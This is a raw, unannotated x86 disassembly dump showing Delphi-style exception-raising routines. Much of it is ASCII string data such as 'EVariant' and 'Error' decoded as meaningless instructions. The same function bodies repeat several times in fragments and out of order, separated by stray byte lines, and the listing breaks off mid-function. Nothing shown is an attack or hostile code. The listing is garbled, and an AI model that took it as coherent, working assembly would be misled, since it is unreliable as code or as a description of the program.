xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ 0x72615645 ] dl
xor al 0x40
0x40 0x0
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
jb r-xdata
popad
jb r-xdata
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
jb r-xdata
outsb
je r-xdata
popad
rol [ eax ] 0xeb
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jmp r-xdata
0x40 0x0
in al dx
outsd
popad
jb r-xdata
inc eax
popad
jb r-xdata
popad
jns r-xdata
outsd
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
inc eax
add ah ch
insd
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
add [ eax ] al
jb r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
inc eax
add [ eax - 0x15 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x15 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
add [ edx + esi + 0x40 ] al
add [ 0x72615645 ] dl
outsb
js r-xdata
xor al 0x40
add ah ch
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add al dl
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jmp r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add ch ch
dec edi
je r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ esp + ebp * 8 + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
in al dx
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
pop ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0xc0040 ] bl
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x45
push esi
popad
jb r-xdata
add [ esp + ebp * 8 ] dh
inc eax
add [ eax ] al
add [ eax ] al
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed69
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40edfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414028
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414028
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee02
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc8
retn
dec ebp
in al 0x8b
mov ebx eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc eax 0x72615645
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
outsd
je r-xdata
popad
push 0x0
xor eax eax
push ebp
push sub_40ed62
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
add [ eax ] al
add [ eax ] al
outsd
jns r-xdata
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ edi ] dl
in al dx
dec bp
insd
outsd
jb r-xdata
sub_40e9f4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp dl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
dec ecx
popad
outsb
je r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
jb r-xdata
outsb
js r-xdata
lodsb [ esi ]
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ 0x72615645 ] dl
popad
push esi
popad
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0040eb
add [ eax ] al
add [ esp + edi * 2 ] cl
outsd
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
jb r-xdata
popad
jb r-xdata
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
jb r-xdata
outsb
je r-xdata
popad
rol [ eax ] 0xeb
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jmp r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
in al dx
outsd
popad
jb r-xdata
inc eax
popad
jb r-xdata
popad
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
outsd
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
inc eax
add ah ch
insd
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
add [ eax ] al
jb r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
inc eax
add [ eax - 0x15 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x15 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
0x40 0x0
0x40 0x0
add [ edx + esi + 0x40 ] al
add [ 0x72615645 ] dl
outsb
js r-xdata
xor al 0x40
add ah ch
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add al dl
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jmp r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add ch ch
dec edi
je r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ esp + ebp * 8 + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
in al dx
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
pop ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0xc0040 ] bl
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x45
push esi
popad
jb r-xdata
add [ esp + ebp * 8 ] dh
inc eax
add [ eax ] al
add [ eax ] al
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed69
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40edfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414028
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414028
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee02
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc8
retn
dec ebp
in al 0x8b
mov ebx eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc eax 0x72615645
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
outsd
je r-xdata
popad
push 0x0
xor eax eax
push ebp
push sub_40ed62
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
add [ eax ] al
add [ eax ] al
outsd
jns r-xdata
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ edi ] dl
in al dx
dec bp
insd
outsd
jb r-xdata
sub_40ea58
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
0xc0040 0x0
sub_40eb88
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr bl 0x1
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
je r-xdata
popad
in al dx
dec bp
insd
outsd
jb r-xdata
in al dx
outsd
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc eax 0x72615645
inc ebp
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
inc eax
add ah ch
insd
dec ebp
in al 0x8b
mov ebx eax
popad
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ edx + esi + 0x40 ] al
add [ 0x72615645 ] dl
outsb
js r-xdata
xor eax eax
push ebp
push sub_40edfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414028
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414028
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee02
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc8
retn
add esp 0xffffffe4
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ edi ] dl
xor al 0x40
add ah ch
jne r-xdata
jb r-xdata
inc ebp
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
je r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ esp + ebp * 8 + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
in al dx
inc eax
add [ eax + eax ] cl
add ch ch
dec edi
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
pop ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0xc0040 ] bl
outsd
jb r-xdata
push 0x0
xor eax eax
push ebp
push sub_40ed62
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed69
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
jb r-xdata
popad
jb r-xdata
inc eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
jns r-xdata
inc eax
jb r-xdata
jo r-xdata
popad
je r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
outsd
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add al dl
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jmp r-xdata
outsd
jb r-xdata
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x45
push esi
popad
jb r-xdata
add [ esp + ebp * 8 ] dh
inc eax
add [ eax ] al
add [ eax ] al
dec ecx
inc eax
add [ eax - 0x15 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x15 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0040eb
add [ eax ] al
add [ esp + edi * 2 ] cl
outsd
jb r-xdata
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax * 2 + 0x69726156 ] dl
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
jb r-xdata
popad
jb r-xdata
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
jb r-xdata
popad
outsb
je r-xdata
rol [ eax ] 0xeb
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jmp r-xdata
popad
jb r-xdata
popad
jns r-xdata
outsb
js r-xdata
lodsb [ esi ]
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ 0x72615645 ] dl
popad
push esi
popad
jb r-xdata
add [ eax ] al
jb r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
outsd
jb r-xdata
0x40 0x0
0x40 0x0
sub_40ed18
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ed62
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed69
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40ed6c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40edfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414028
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414028
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee02
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc8
retn
sub_40ee08
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ee52
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee59
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40ee5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40eeeb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414028
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414028
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eef2
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc8
retn
sub_40eef8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ef42
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
